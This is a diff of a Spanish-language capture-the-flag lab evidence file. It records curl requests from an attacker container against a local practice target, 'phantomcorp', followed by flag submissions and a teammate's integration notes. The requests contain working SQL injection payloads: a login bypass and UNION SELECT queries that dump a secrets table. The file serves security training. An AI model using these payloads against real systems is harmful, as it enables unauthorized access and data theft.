@@ -1,7 +1,32 @@
-2026-11-19 (UTC−03:00) · Checkout local de Fernando Cagliero · Git Bash
-Desde la raíz del repositorio:
+Laboratorio 07 — bloque de Lorenzo — Grupo 07
+Fecha local: 2026-11-19 (America/Buenos_Aires)
 
-{ bash ./ctf status 07; printf "[ctf status] código de salida: %s\n" "$?"; } > entregas/lab07/grupo07/evidencia/salidas/status-07-local.txt 2>&1
+Preparación del objetivo local:
+  docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml up -d --build
 
-Estado consultado: 0/5 registrados en este checkout.
-Pendientes de integrar: bitácoras y salidas originales de Lorenzo (R1–R2), Lautaro (R3–R4) y Guadalupe (R5), y captura consolidada de status.
+Requests ejecutados desde cyberlab-attacker (solo contra phantomcorp):
+  curl -sS -i -X POST http://phantomcorp/login --data-urlencode "user=admin' --" --data-urlencode 'pass=not-the-password'
+  curl -sS -i -G http://phantomcorp/buscar --data-urlencode 'q=Router'
+  curl -sS -i -G http://phantomcorp/buscar --data-urlencode "q=x' UNION SELECT 1,2 -- "
+  curl -sS -i -G http://phantomcorp/buscar --data-urlencode "q=x' UNION SELECT 1,2,3 -- "
+  curl -sS -i -G http://phantomcorp/buscar --data-urlencode "q=x' UNION SELECT * FROM secrets -- "
+  curl -sS -i -G http://phantomcorp/buscar --data-urlencode "q=x' UNION SELECT name,secret FROM secrets -- "
+
+Entrega de flags observadas (ejecutado desde la raíz del repositorio con Git Bash; se guardó el comando en un script para que Windows preserve las llaves de FLAG{...}):
+  ./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'
+  ./ctf submit 07 R2 'FLAG{sqli_union_dump}'
+  ./ctf status 07
+
+El estado completo está en salidas/status-07.txt. Las respuestas HTTP completas están en salidas/r1-r2-http.txt.
+
+
+# Integración de Fernando — 20/11/2026 (America/Buenos_Aires)
+# R3/R4 y sus requests: ver comandos-lautaro.txt y las salidas originales.
+# La evidencia de Guadalupe identifica sus requests en su propia captura.
+# Flags tomadas exclusivamente de salidas crudas de los operadores del grupo.
+# Validación consolidada: bash ./ctf submit 07 R1 <flag-observada> (repetir R2–R5).
+# bash ./ctf status 07
+# bash bin/validar-repo.sh
+# En Windows se usó git archive upstream/main para ejecutar scripts con LF,
+# copiando esta entrega a la exportación temporal y usando Python 3.12.
+# No se repitieron ataques; no se cambió el entorno Docker.
